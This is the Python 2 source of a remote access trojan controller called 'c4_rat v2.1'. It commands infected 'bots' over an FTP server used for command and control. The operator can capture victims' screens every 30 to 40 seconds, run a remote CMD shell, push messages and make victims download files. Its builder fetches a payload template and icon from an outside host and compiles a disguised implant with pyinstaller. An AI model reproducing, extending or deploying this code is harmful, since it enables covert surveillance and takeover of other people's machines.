#! python2
# Made by cr4sh3r
# c4_rat - v2.1

import Tkinter, urllib2, ctypes, ftplib, wget, time, os

# These Variables are set by the host
# Feel free to change their values

art = """
        ___               _   _                             _
       /   |             | | | |                           | |
  ___ / /| |  _ __  _   _| |_| |__   ___  _ __    _ __ __ _| |_
 / __/ /_| | | '_ \| | | | __| '_ \ / _ \| '_ \  | '__/ _` | __|
| (__\___  | | |_) | |_| | |_| | | | (_) | | | | | | | (_| | |_
 \___|   |_/ | .__/ \__, |\__|_| |_|\___/|_| |_| |_|  \__,_|\__|
             | |     __/ |
             |_|    |___/      version 2.1

 cr4sh3r                   """


# Name of the user

hacker = "cr4sh3r"

# Server url

ser = "http://www.example.net/"

# Server ftp data

ser_host = 'ftp.example.net'
ser_logi = 'username'
ser_pasi = '1234'
ser_myurl = 'www.example.net'

# Server id

sid = "01"

# Some other variables...
# Do not alter!

usr = ""
cbi = ""
botavl = True
cbotid = ""
ftp = ftplib.FTP(ser_host, ser_logi , ser_pasi)
cta = ''''''

# -----(-----)-----

# ***(menu_def_start)***

def screenlog():
    def bidw(event):
        imfurl = sccie.get()
        wget.download(ser + "images" + "/" + cbotid + "/" + imfurl)


    # Window

    screenlogmen = Tkinter.Tk()
    screenlogmen.configure(background = "#333")
    screenlogmen.title("c4")
    screenlogmen.geometry("350x350+300+300")

    # Images

    # Text

    ftp.cwd('public_html')
    ftp.cwd('images')
    ftp.cwd(cbotid)

    log = []
    ftp.retrlines('LIST', callback=log.append)
    files = (line.rsplit(None, 1)[1] for line in log)
    files_list = list(files)

    citlay = '''
     (The screen is registered every 30-40 sec)
     Select the image you want to download:
     %s
     ''' %(files_list)

    ftp.cwd("../")
    ftp.cwd("../")
    ftp.cwd("../")

    scit = Tkinter.Label(screenlogmen, text = citlay)
    scit.configure(background = "#333", foreground="white")

    # Entry

    sccie = Tkinter.Entry(screenlogmen, width = 50)
    sccie.bind("<Return>", bidw)

    # Packing...

    scit.pack(anchor = "center", side = "top")
    sccie.pack(anchor = "center", side = "top")






    # Main loop

    screenlogmen.mainloop()

def cmdcon():

    ctypes.windll.user32.MessageBoxA(0, "Commands may take up to 15 sec to respond!", "Alert!", 1)

    def cget(event):

        ftp.cwd('public_html')
        ftp.cwd('cmd')
        ftp.cwd(cbotid)

        aga = open("aat.js" , 'w')
        vic_com = cpet.get()
        aga.write(vic_com)
        aga.close()
        ftp.storbinary("STOR aat.js", open("aat.js", "rb"))
        time.sleep(5)

        urlup78 = ser + "cmd/" + cbotid + "/tpo.js"
        usock = urllib2.urlopen(urlup78)
        updatz79 = usock.read()
        usock.close()
        time.sleep(5)




        global cta
        cta = updatz79
        cmditlay = cta
        cmdit = Tkinter.Label(cmdconmen, text = cmditlay)
        cmdit.configure(background = "lime green", foreground="blue", height=20, width=60)

        scrollbar = Tkinter.Scrollbar(cmdconmen)
        text = Tkinter.Text(cmdconmen, wrap='word', yscrollcommand=scrollbar.set)
        text.configure(background = "lime green", foreground="blue")
        text.insert('1.0',cmditlay)
        text.pack(anchor = "center", side = "top")
        scrollbar.config(command=text.yview)


        ftp.cwd("../")
        ftp.cwd("../")
        ftp.cwd("../")

        time.sleep(3)

        ftp.cwd('public_html')
        ftp.cwd('wtd')
        ftp.cwd(cbotid)

        asno = open("asno.html" , 'w')
        asno.write("1")
        asno.close()
        ftp.storbinary("STOR asno.html", open("asno.html" , 'rb'))

        ftp.cwd("../")
        ftp.cwd("../")
        ftp.cwd("../")




    # Window

    cmdconmen = Tkinter.Tk()
    cmdconmen.configure(background = "#333")
    cmdconmen.title("c4")
    cmdconmen.geometry("600x400+300+300")

    # Interface



    # Entry

    cpet = Tkinter.Entry(cmdconmen, width = 70)
    cpet.bind("<Return>", cget)


    # Packing...


    cpet.pack(anchor = "center", side = "bottom")

    # Main loop

    cmdconmen.mainloop()

def dmes():

    def messe(event):
        global mtbd
        mtbd = dmet.get()

        ftp.cwd('public_html')
        ftp.cwd('dm')
        ftp.cwd(cbotid)

        mec = open("bling.js" , 'w')
        mec.write(mtbd)
        mec.close()
        ftp.storbinary("STOR bling.js", open("bling.js" , 'rb'))
        time.sleep(5)
        mtpo = "The bot is now displaying: %s" % (mtbd)
        ctypes.windll.user32.MessageBoxA(0, mtpo, "c4_rat-v2.0", 1)

        ftp.cwd("../")
        ftp.cwd("../")
        ftp.cwd("../")


    # Window

    messagemen = Tkinter.Tk()
    messagemen.configure(background = "#333")
    messagemen.title("c4")
    messagemen.geometry("350x350+300+300")

    # Interface

    # Text

    dmtilay = '''
    Type the message you want to display
    '''

    dmti = Tkinter.Label(messagemen, text = dmtilay)
    dmti.configure(background = "#333", foreground="white")

    # Entry

    dmet = Tkinter.Entry(messagemen, width = 70)
    dmet.bind("<Return>", messe)



    # Packing...

    dmti.pack(side = "top", anchor = "center")
    dmet.pack(side = "top", anchor = "center")


    # Main loop
    messagemen.mainloop()

def dfile():

    def dfiop(event):
        global ftbd0
        ftbd0 = dfet.get()

        ftp.cwd('public_html')
        ftp.cwd('df')
        ftp.cwd(cbotid)

        mez = open("blong.js" , 'w')
        mez.write(ftbd0)
        mez.close()
        ftp.storbinary("STOR blong.js", open("blong.js" , 'rb'))
        time.sleep(5)

        mtpo = "The bot is now downloading: %s" % (ftbd0)
        ctypes.windll.user32.MessageBoxA(0, mtpo, "c4_rat-v2.0", 1)

        ftp.cwd("../")
        ftp.cwd("../")
        ftp.cwd("../")

    # Window

    dfilegmen = Tkinter.Tk()
    dfilegmen.configure(background = "#333")
    dfilegmen.title("c4")
    dfilegmen.geometry("350x350+300+300")

    # Interface

    # Text

    dftilay = '''
    Tell the bot what to download
    Ex: http://i.imgur.com/m6a0Vrm.jpg
    '''

    dfti = Tkinter.Label(dfilegmen, text = dftilay)
    dfti.configure(background = "#333", foreground="white")

    # Entry

    dfet = Tkinter.Entry(dfilegmen, width = 70)
    dfet.bind("<Return>", dfiop)

    # Packing ...

    dfti.pack(side = "top", anchor = "center")
    dfet.pack(side = "top", anchor = "center")

    # Main loop

    dfilegmen.mainloop()

def bot_selection():
    botselmen = Tkinter.Tk()
    botselmen.configure(background = "#333")
    botselmen.title("c4")
    botselmen.geometry("190x200+300+300")

    def setbotidfun(ne):

        # Set the unavailable bots

        notavailablebots = [0]

        # Set the amount unavailable bots

        num = 1

        for i in range(num):
            if ne == notavailablebots[i]:
                global botavl
                botavl = False
                break

            else:
                botavl = True


        if botavl == False:
            ctypes.windll.user32.MessageBoxA(0, "not available", "ERROR!", 1)
        else:
            global cbotid
            cbotid = "0%s" % (ne)
            sume = "You are now controlling bot %s" % (cbotid)
            botselmen.destroy()
            ctypes.windll.user32.MessageBoxA(0, sume, "c4_rat-v2.0", 1)
            menu()






    # Explanatory text

    betx = Tkinter.Label(text = "Select your bot:")
    betx.configure(background = "#333", foreground="white")

    # Bot selection button 1

    bsb1 = Tkinter.Button(botselmen, text = "01", height = 1, width = 30, command=lambda:setbotidfun(1))
    bsb1.configure(background = "#888", foreground="white")

    # Bot selection button 2

    bsb2 = Tkinter.Button(botselmen, text = "02", height = 1, width = 30, command=lambda:setbotidfun(2))
    bsb2.configure(background = "#888", foreground="white")

    # Bot selection button 3

    bsb3 = Tkinter.Button(botselmen, text = "03", height = 1, width = 30, command=lambda:setbotidfun(3))
    bsb3.configure(background = "#888", foreground="white")

    # Bot selection button 4

    bsb4 = Tkinter.Button(botselmen, text = "04", height = 1, width = 30, command=lambda:setbotidfun(4))
    bsb4.configure(background = "#888", foreground="white")

    # Bot selection button 5

    bsb5 = Tkinter.Button(botselmen, text = "05", height = 1, width = 30, command=lambda:setbotidfun(5))
    bsb5.configure(background = "#888", foreground="white")

    # Packing...

    betx.pack(anchor = "w", side = "top")
    bsb1.pack(anchor = "w", side = "top")
    bsb2.pack(anchor = "w", side = "top")
    bsb3.pack(anchor = "w", side = "top")
    bsb4.pack(anchor = "w", side = "top")
    bsb5.pack(anchor = "w", side = "top")

    # Main loop

    botselmen.mainloop()

def menu():
        global ftp
        ftplwel = ftp.getwelcome()
        ctypes.windll.user32.MessageBoxA(0, ftplwel, "Welcome!", 1)


        def botc(event):
            global cbi

            cbi = bce.get()

            if cbi == "1":
                ftp.cwd('public_html')
                ftp.cwd('wtd')
                ftp.cwd(cbotid)
                asno = open("asno.html" , 'w')
                asno.write("2")
                asno.close()
                ftp.storbinary("STOR asno.html", open("asno.html" , 'rb'))
                ftp.cwd("../")
                ftp.cwd("../")
                ftp.cwd("../")
                bine = "The bot is now executing option %s" % (cbi)
                ctypes.windll.user32.MessageBoxA(0, bine, "Alert!", 1)
                screenlog()



            elif cbi == "2":
                ftp.cwd('public_html')
                ftp.cwd('wtd')
                ftp.cwd(cbotid)
                asno = open("asno.html" , 'w')
                asno.write("3")
                asno.close()
                ftp.storbinary("STOR asno.html", open("asno.html" , 'rb'))
                ftp.cwd("../")
                ftp.cwd("../")
                ftp.cwd("../")
                bine = "The bot is now executing option %s" % (cbi)
                ctypes.windll.user32.MessageBoxA(0, bine, "Alert!", 1)
                cmdcon()


            elif cbi == "3":
                ftp.cwd('public_html')
                ftp.cwd('wtd')
                ftp.cwd(cbotid)
                asno = open("asno.html" , 'w')
                asno.write("4")
                asno.close()
                ftp.storbinary("STOR asno.html", open("asno.html" , 'rb'))
                ftp.cwd("../")
                ftp.cwd("../")
                ftp.cwd("../")
                bine = "The bot is now executing option %s" % (cbi)
                ctypes.windll.user32.MessageBoxA(0, bine, "Alert!", 1)
                dmes()

            elif cbi == "4":
                ftp.cwd('public_html')
                ftp.cwd('wtd')
                ftp.cwd(cbotid)
                asno = open("asno.html" , 'w')
                asno.write("5")
                asno.close()
                ftp.storbinary("STOR asno.html", open("asno.html" , 'rb'))
                ftp.cwd("../")
                ftp.cwd("../")
                ftp.cwd("../")
                bine = "The bot is now executing option %s" % (cbi)
                ctypes.windll.user32.MessageBoxA(0, bine, "Alert!", 1)
                dfile()


            else:
                ctypes.windll.user32.MessageBoxA(0, "Not available!", "ERROR!", 1)



            return cbi


        # Window

        men = Tkinter.Tk()
        men.configure(background = "#333")
        men.title("c4_rat-v2.0")
        men.geometry("600x400+300+300")

        # Current bot
        btt = Tkinter.Label(text = "Bot: " + cbotid)
        btt.configure(background = "#333", foreground="white")


        # Bot control

        # Text
        bct1text = '''
        What do you want the bot to do?
         '''
        bct1 = Tkinter.Label(text = bct1text)
        bct1.configure(background = "#333", foreground="white")

        # Options

        bctlay = '''
        1 - Monitor the screen
        2 - Create a CMD shell (not totally stable)
        3 - Display a message
        4 - Download a file
         '''

        bcto = Tkinter.Label(text = bctlay)
        bcto.configure(background = "#333", foreground="white")

        # Entry

        bce = Tkinter.Entry(men, width = 50)
        bce.bind("<Return>", botc)

        # Buttons

        but1 = Tkinter.Button(men, text = "Monitor the screen", height = 1, width = 15)
        but1.configure(background = "#888", foreground="white")
        but2 = Tkinter.Button(men, text = "Control the CMD", height = 1, width = 15)
        but2.configure(background = "#888", foreground="white")

        # Packing...

        btt.pack(side = "top", anchor = "w")
        bct1.pack(side = "top", anchor = "center")
        bcto.pack(side = "top", anchor = "center")
        bce.pack(side = "top", anchor = "center")


        # Main loop
        men.mainloop()

def funsele():
    funsele = Tkinter.Tk()
    funsele.configure(background = "#333")
    funsele.title("c4")
    funsele.geometry("200x100+300+300")

    def buildo():
        funsele.destroy()
        build()

    def contro():
        funsele.destroy()
        bot_selection()




    # Explanatory text

    betx = Tkinter.Label(text = "What do you want to do?")
    betx.configure(background = "#333", foreground="white")

    # Build

    bsb1 = Tkinter.Button(funsele, text = "Build", height = 1, width = 30, command=lambda:buildo())
    bsb1.configure(background = "#888", foreground="white")

    # Control

    bsb2 = Tkinter.Button(funsele, text = "Control", height = 1, width = 30, command=lambda:contro())
    bsb2.configure(background = "#888", foreground="white")

    # Packing...

    betx.pack(anchor = "w", side = "top")
    bsb1.pack(anchor = "w", side = "top")
    bsb2.pack(anchor = "w", side = "top")

    # Main loop

    funsele.mainloop()

def build():
    '''
    Requires Python 2.7 + getpass, ctypes, PIL.ImageGrab, ftplib, urllib,
    os, time, sys, wget, traceback, urllib2, subprocess and Pyinstaller modules.
    '''

    # Window
    bmen = Tkinter.Tk()
    bmen.configure(background = "#333")
    bmen.title("c4_rat-v2.0")
    bmen.geometry("315x320+300+300")

    # Functions

    def gethost(event):
        global  vir_host
        vir_host = be1.get()
        return vir_host
    def getlogi(event):
        global vir_logi
        vir_logi = be2.get()
        return vir_logi
    def getpasi(event):
        global vir_pasi
        vir_pasi = be3.get()
        return vir_pasi
    def getbot(event):
        global vir_vicid
        vir_vicid = be4.get()
        return vir_vicid
    def geturl(event):
        global vir_myurl
        vir_myurl = be5.get()
        return vir_myurl

    def buildit():
        wget.download('http://zepikao.my3gb.com/Sh3lz/base.py')
        wget.download('http://zepikao.my3gb.com/Sh3lz/t.ico')
        texthe = '''
#! python2

# Variables

nigga = 0

vir_host = '%s'
vir_logi = '%s'
vir_pasi = '%s'
vir_vicid = '%s'
vir_myurl = '%s' ''' % (vir_host, vir_logi, vir_pasi, vir_vicid, vir_myurl)
        editbas =  open('base.py', 'w')
        editbas.write(texthe)
        editbas.close()
        os.system('pyinstaller base.py --onefile -w --clean -i t.ico')
        os.system('del base.py')
        os.system('del t.ico')
        ctypes.windll.user32.MessageBoxA(0, "The building process has finished!", "HEY!", 1)


    # Text
    bumenetext = '''
    Insert your data...
    PRESS ENTER TO CONFIRM
    (HAS TO BE DONE ON EACH ENTRY)'''

    bumenetext = Tkinter.Label(text = bumenetext)
    bumenetext.configure(background = "#333", foreground="white")

    # Entries

    be1 = Tkinter.Entry(bmen)
    be1.insert(10,"ftp.example.net")
    be1.configure(background = "white", foreground="black")
    be1.bind("<Return>", gethost)

    be1t = Tkinter.Label(text = "Host:")
    be1t.configure(background = "#333", foreground="white")

    be2 = Tkinter.Entry(bmen)
    be2.insert(10,"username")
    be2.configure(background = "white", foreground="black")
    be2.bind("<Return>", getlogi)

    be2t = Tkinter.Label(text = "Login:")
    be2t.configure(background = "#333", foreground="white")

    be3 = Tkinter.Entry(bmen)
    be3.insert(10,"1234")
    be3.configure(background = "white", foreground="black")
    be3.bind("<Return>", getpasi)

    be3t = Tkinter.Label(text = "Password:")
    be3t.configure(background = "#333", foreground="white")

    be4 = Tkinter.Entry(bmen)
    be4.insert(10,"07")
    be4.configure(background = "white", foreground="black")
    be4.bind("<Return>", getbot)

    be4t = Tkinter.Label(text = "Bot ID:")
    be4t.configure(background = "#333", foreground="white")

    be5 = Tkinter.Entry(bmen)
    be5.insert(10,"example.com")
    be5.configure(background = "white", foreground="black")
    be5.bind("<Return>", geturl)

    be5t = Tkinter.Label(text = "URL:")
    be5t.configure(background = "#333", foreground="white")

    bbb1 = Tkinter.Button(bmen, text = "BUILD", height = 1, width = 20, command=lambda:buildit())
    bbb1.configure(background = "#888", foreground="white")



    # Packing

    bumenetext.pack(side = 'top')

    be1t.pack(side = "top", anchor = "center")
    be1.pack(side = "top", anchor = "center")

    be2t.pack(side = "top", anchor = "center")
    be2.pack(side = "top", anchor = "center")

    be3t.pack(side = "top", anchor = "center")
    be3.pack(side = "top", anchor = "center")

    be4t.pack(side = "top", anchor = "center")
    be4.pack(side = "top", anchor = "center")

    be5t.pack(side = "top", anchor = "center")
    be5.pack(side = "top", anchor = "center")

    bbb1.pack(side = "bottom", anchor = "center")


    # Main loop

    bmen.mainloop()

# ***(menu_def_end)***

# ***(login_def_start)***

def login():
    # The main function


    # Function used to capture values


    def getusr(event):
        global usr
        usr = e1.get()
        p3 = ser + hacker + ".js"

        if urllib2.urlopen(p3).getcode() == 200:
            try:
                f2 = urllib2.urlopen(p3)
                ucx = f2.read()
                f2.close()
                if ucx == "<!DOCTYPE html>":
                    root.destroy()
                    ctypes.windll.user32.MessageBoxA(0, "404", "ERROR!", 1)
                elif ucx == usr:
                    root.destroy()
                    funsele()
                else:
                    root.destroy()
                    ctypes.windll.user32.MessageBoxA(0, "Access denied!", "ERROR!", 1)
            except e1:
                root.destroy()
                ctypes.windll.user32.MessageBoxA(0, "Forbidden!", "C4_RAT", 1)

        else:
            root.destroy()
            ctypes.windll.user32.MessageBoxA(0, "Server is down!", "ERROR!", 1)

        return usr



    # Window

    root = Tkinter.Tk()
    root.configure(background = "#333")
    root.title("c4_rat-v2.0")
    root.geometry("600x400+300+300")

    # Welcome text
    well = Tkinter.Label(text = "Welcome to the c4_rat-v2.0,  _" + hacker +"_  !  ||  Current server : " + sid)
    well.configure(background = "#333", foreground="white")

    # Art
    global art

    atext = Tkinter.Text(root, wrap='word')
    atext.configure(background = "#333", foreground="white")
    atext.insert('1.0',art)


    # Login
    e1 = Tkinter.Entry(root)
    e1.insert(10,"password")
    lt = Tkinter.Label(text = "Insert your password:")
    lt.configure(background = "#333", foreground="white")
    e1.bind("<Return>", getusr)





    # Packing...


    e1.pack(side = "bottom", anchor = "w")

    lt.pack(side = "bottom", anchor = "w")

    well.pack(side = "top", anchor = "w")

    atext.pack(side = "top", anchor = "center")

    # Main loop

    root.mainloop()

# ***(login_def_end)***

# -----(-----)-----


login()

